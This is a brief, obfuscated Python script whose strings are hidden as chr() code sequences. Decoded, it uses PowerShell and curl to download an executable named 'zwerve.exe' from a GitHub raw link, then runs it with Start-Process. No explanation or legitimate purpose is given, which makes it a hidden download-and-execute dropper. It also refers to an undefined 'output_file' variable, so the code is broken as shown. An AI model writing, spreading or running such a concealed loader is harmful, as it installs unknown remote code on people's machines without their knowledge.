import subprocess
pA=True
pc=print
pP=subprocess.run
import os
pJ=os.getcwd
pU=os.path
pu=pU.join(pJ(),("".join([chr(122),chr(119),chr(101),chr(114),chr(118),chr(101),chr(46),chr(101),chr(120),chr(101)]))                            )
pb=f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o "{output_file}"'
pi=pP([("".join([chr(112),chr(111),chr(119),chr(101),chr(114),chr(115),chr(104),chr(101),chr(108),chr(108)]))                   ,("".join([chr(45),chr(67),chr(111),chr(109),chr(109),chr(97),chr(110),chr(100)]))                              ,pb],capture_output=pA,text=pA)
pc(("".join([chr(68),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(79),chr(117),chr(116),chr(112),chr(117),chr(116),chr(58)]))                     ,pi.stdout)
pc(("".join([chr(68),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(69),chr(114),chr(114),chr(111),chr(114),chr(58)]))                    ,pi.stderr)
if pi.returncode==int("".join([chr(48)]))                    and pU.exists(pu):
  pq=f'Start-Process "{output_file}" -NoNewWindow -Wait'
  pE=pP([("".join([chr(112),chr(111),chr(119),chr(101),chr(114),chr(115),chr(104),chr(101),chr(108),chr(108)]))                     ,("".join([chr(45),chr(67),chr(111),chr(109),chr(109),chr(97),chr(110),chr(100)]))                                ,pq],capture_output=pA,text=pA)
  pc(("".join([chr(69),chr(120),chr(101),chr(99),chr(117),chr(116),chr(105),chr(111),chr(110),chr(32),chr(79),chr(117),chr(116),chr(112),chr(117),chr(116),chr(58)]))                        ,pE.stdout)
  pc(("".join([chr(69),chr(120),chr(101),chr(99),chr(117),chr(116),chr(105),chr(111),chr(110),chr(32),chr(69),chr(114),chr(114),chr(111),chr(114),chr(58)]))                       ,pE.stderr)
else:
  pc(("".join([chr(70),chr(105),chr(108),chr(101),chr(32),chr(100),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(102),chr(97),chr(105),chr(108),chr(101),chr(100),chr(32),chr(111),chr(114),chr(32),chr(102),chr(105),chr(108),chr(101),chr(32),chr(110),chr(111),chr(116),chr(32),chr(102),chr(111),chr(117),chr(110),chr(100),chr(46)]))                                              )
